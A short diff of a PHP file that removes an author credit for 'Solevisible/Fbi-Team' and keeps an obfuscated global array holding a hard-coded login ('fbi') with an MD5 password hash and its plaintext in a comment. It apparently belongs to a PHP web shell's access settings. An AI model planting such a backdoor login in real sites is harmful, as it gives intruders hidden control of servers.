@@ -1,11 +1,4 @@
 <?php
-/*
-	Author: 	Solevisible/Fbi-Team
-	Telegram: 	https://telegram.me/solevisible
-	YouTube: 	https://youtube.com/solevisible
-	Gmail:		solevisible@gmail.com
-	Date:		Monday, September 14, 2020
-*/
 $GLOBALS['oZgNypoPRU'] = array(
     'username' => 'fbi',
     'password' => 'a6f452ec3293d7fb72c5b677257b20ec',//md5(ehsan)
